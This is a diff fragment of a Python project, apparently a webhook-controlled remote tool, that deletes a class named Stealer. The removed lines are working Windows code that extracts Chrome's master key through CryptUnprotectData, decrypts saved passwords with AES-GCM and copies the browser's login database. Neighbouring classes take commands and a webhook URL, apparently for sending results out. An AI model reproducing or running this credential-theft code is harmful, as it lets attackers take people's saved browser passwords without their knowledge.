@@ -824,56 +824,6 @@ class Crawler:
                 msg_instance = System_Messages(webhook_url=self.webhook_url,error=True,headers=None,payload=None,message=str(e),is_msg=False)
                 msg_instance.msg()
 
-class Stealer: 
-    def __init__(self,webhook): 
-        self.webhook = webhook
-        self.CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
-        self.CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
-
-    def get_secret_key(self):
-        try:
-            with open( self.CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
-                local_state = f.read()
-                local_state = json.loads(local_state)
-            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-            secret_key = secret_key[5:] 
-            secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
-            return secret_key
-        except Exception as e:
-            print("%s"%str(e))
-            print("[ERR] Chrome secretkey cannot be found")
-            return None
-    
-    def decrypt_payload(self,cipher, payload):
-        return cipher.decrypt(payload)
-    
-    def generate_cipher(self,aes_key, iv):
-        return AES.new(aes_key, AES.MODE_GCM, iv)
-
-    def decrypt_password(self, ciphertext, secret_key):
-        try:
-            initialisation_vector = ciphertext[3:15]
-            encrypted_password = ciphertext[15:-16]
-            cipher = self.generate_cipher(secret_key, initialisation_vector)
-            decrypted_pass = self.decrypt_payload(cipher, encrypted_password)
-            decrypted_pass = decrypted_pass.decode()  
-            return decrypted_pass
-        except Exception as e:
-            print("%s"%str(e))
-            print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
-            return ""
-    
-
-    def get_db_connection(self,chrome_path_login_db):
-        try:
-            print(chrome_path_login_db)
-            shutil.copy2(chrome_path_login_db, "Loginvault.db") 
-            return sqlite3.connect("Loginvault.db")
-        except Exception as e:
-            print("%s"%str(e))
-            print("[ERR] Chrome database cannot be found")
-            return None
-
                 
 class Process: 
     def __init__(self,command,webhook_url):
